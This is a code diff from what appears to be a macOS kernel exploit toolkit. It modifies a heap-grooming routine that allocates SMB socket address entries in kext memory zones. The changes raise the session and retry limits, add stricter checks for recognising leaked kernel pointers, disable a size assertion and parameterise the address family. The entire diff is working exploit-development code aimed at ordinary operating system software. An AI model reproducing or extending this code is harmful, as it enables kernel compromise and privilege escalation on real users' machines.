@@ -32,8 +32,8 @@
 #define NUM_PAD_ELEMENTS (XE_PAGE_SIZE / 32)
 #define NUM_GAP_ELEMENTS (XE_PAGE_SIZE / 32 * 2)
 
-#define MAX_TRIES 5
-#define MAX_SESSIONS 5
+#define MAX_TRIES 25
+#define MAX_SESSIONS 200
 
 const int zone_kext_sizes[] = {
     16, 32, 48, 64, 80, 96, 128, 160, 192, 224, 256
@@ -65,7 +65,15 @@ int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_
     memcpy(&entry, name + skip_bytes, sizeof(entry));
     
     uintptr_t allocated_address = (uintptr_t)entry.addr;
-    if (xe_vm_kernel_address_valid(allocated_address) && allocated_address % z_elem_size == 0) {
+    uintptr_t prev = (uintptr_t)entry.next.tqe_prev;
+    uintptr_t next = (uintptr_t)entry.next.tqe_next;
+    
+//    xe_util_binary_hex_dump((char*)&entry, sizeof(entry));
+//    printf("\n\n");
+    
+    uintptr_t local_addr = allocated_address & (XE_PAGE_SIZE - 1);
+    
+    if (xe_vm_kernel_address_valid(allocated_address) && local_addr && local_addr % z_elem_size == 0 && xe_vm_kernel_address_valid(prev) && (prev - offsetof(struct sock_addr_entry, next.tqe_next)) % 32 == 0 && xe_vm_kernel_address_valid(next) && next % 32 == 0) {
         *out = allocated_address;
         return 0;
     }
@@ -73,8 +81,8 @@ int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_
     return ENOENT;
 }
 
-int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, char* data, uint8_t data_size, struct kmem_zkext_alloc_small_entry* out) {
-    xe_assert_cond(data_size, <=, alloc_size - 8);
+int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, uint8_t sa_family, char* data, uint8_t data_size, struct kmem_zkext_alloc_small_entry* out) {
+//    xe_assert_cond(data_size, <=, alloc_size - 8);
     
     int zone_size = -1;
     for (int i = 0; i < xe_array_size(zone_kext_sizes); i++) {
@@ -103,7 +111,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc
         /// Allocate a `struct sock_addr_entry` element with given data in memory pointed by `entry->addr + 8`
         error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* address_len, sa_family_t* address_family, char** arbitary_data, size_t* arbitary_data_len, size_t index) {
             *address_len = alloc_size;
-            *address_family = AF_INET;
+            *address_family = sa_family;
             *arbitary_data = data;
             *arbitary_data_len = data_size;
         }, NULL);
@@ -116,7 +124,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc
     
     uintptr_t value = 0;
     for (int try = 0; try < MAX_TRIES; try++) {
-        xe_log_debug("alloc session try %d / %d", try, MAX_TRIES);
+//        xe_log_debug("alloc session try %d / %d", try, MAX_TRIES);
         
         static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
         uint8_t sock_addr_entry_zone = 32;
@@ -172,11 +180,11 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc
 }
 
 
-struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, uint8_t alloc_size, char* data, uint8_t data_size) {
+struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, uint8_t alloc_size, uint8_t sa_family, char* data, uint8_t data_size) {
     for (int i = 0; i < MAX_SESSIONS; i++) {
-        xe_log_debug("alloc session %d / %d", i, MAX_SESSIONS);
+//        xe_log_debug("alloc session %d / %d", i, MAX_SESSIONS);
         struct kmem_zkext_alloc_small_entry entry;
-        int error = kmem_zkext_alloc_small_try(smb_addr, alloc_size, data, data_size, &entry);
+        int error = kmem_zkext_alloc_small_try(smb_addr, alloc_size, sa_family, data, data_size, &entry);
         if (!error) {
             return entry;
         }
